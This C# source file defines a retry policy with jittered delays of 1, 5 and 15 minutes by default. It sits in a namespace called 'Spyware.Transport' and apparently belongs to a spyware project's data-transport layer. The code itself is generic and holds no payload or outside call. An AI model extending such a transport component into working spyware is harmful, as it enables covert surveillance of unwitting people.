using Spyware.Core.Scheduling;

namespace Spyware.Transport;

public sealed class RetryPolicy
{
    private readonly IReadOnlyList<int> _delaysMinutes;

    public RetryPolicy(IEnumerable<int>? delaysMinutes)
    {
        var list = (delaysMinutes ?? Array.Empty<int>()).Where(d => d > 0).ToList();
        _delaysMinutes = list.Count > 0 ? list : new List<int> { 1, 5, 15 };
    }

    public int MaxAttempts => _delaysMinutes.Count;

    public TimeSpan GetDelay(int attempt)
    {
        int index = Math.Clamp(attempt - 1, 0, _delaysMinutes.Count - 1);
        return Jitter.ApplyPercent(TimeSpan.FromMinutes(_delaysMinutes[index]), 0.20);
    }
}
